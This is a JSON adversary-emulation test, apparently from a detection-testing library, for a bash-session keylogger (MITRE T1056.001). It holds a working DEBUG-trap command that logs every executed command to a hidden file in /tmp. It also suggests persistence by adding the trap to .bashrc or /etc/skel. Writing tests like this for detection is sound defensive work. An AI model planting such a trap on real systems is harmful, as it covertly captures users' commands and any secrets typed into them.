{
  "id": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
  "name": "Bash session based keylogger",
  "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "40de6ba7-8bd4-55e7-8842-5c2516be98e1",
      "type": "execute-command",
      "data": {
        "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" \u003e\u003e #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "e8679d17-b46c-5864-a56b-4597cbcb44e2",
      "type": "execute-command",
      "data": {
        "command": "rm #{output_file}",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "60b5b49f-b666-5a0d-bf42-a102d0abc660",
      "name": "Check dependency 1/1",
      "description": "This test requires to be run in a bash shell\n",
      "type": "execute-command",
      "data": {
        "command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "6fdcf4be-1f27-5550-a5c8-77087c76fe6f",
      "name": "Resolve dependency 1/1",
      "description": "This test requires to be run in a bash shell\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"\"",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "60b5b49f-b666-5a0d-bf42-a102d0abc660",
      "name": "Re-check dependency 1/1",
      "description": "This test requires to be run in a bash shell\n",
      "type": "execute-command",
      "data": {
        "command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi",
        "command_type": "bash"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "40de6ba7-8bd4-55e7-8842-5c2516be98e1",
      "p": "on-success",
      "o": "e8679d17-b46c-5864-a56b-4597cbcb44e2"
    },
    {
      "s": "40de6ba7-8bd4-55e7-8842-5c2516be98e1",
      "p": "on-failure",
      "o": "e8679d17-b46c-5864-a56b-4597cbcb44e2"
    },
    {
      "s": "60b5b49f-b666-5a0d-bf42-a102d0abc660",
      "p": "on-success",
      "o": "40de6ba7-8bd4-55e7-8842-5c2516be98e1"
    },
    {
      "s": "60b5b49f-b666-5a0d-bf42-a102d0abc660",
      "p": "on-failure",
      "o": "6fdcf4be-1f27-5550-a5c8-77087c76fe6f"
    },
    {
      "s": "6fdcf4be-1f27-5550-a5c8-77087c76fe6f",
      "p": "on-success",
      "o": "60b5b49f-b666-5a0d-bf42-a102d0abc660"
    },
    {
      "s": "60b5b49f-b666-5a0d-bf42-a102d0abc660",
      "p": "on-failure",
      "o": "40de6ba7-8bd4-55e7-8842-5c2516be98e1"
    }
  ],
  "tags": [
    "T1056",
    "T1056.001"
  ],
  "input_arguments": [
    {
      "name": "output_file",
      "type": "string",
      "description": "File to store captured commands",
      "value": "/tmp/.keyboard.log"
    }
  ]
}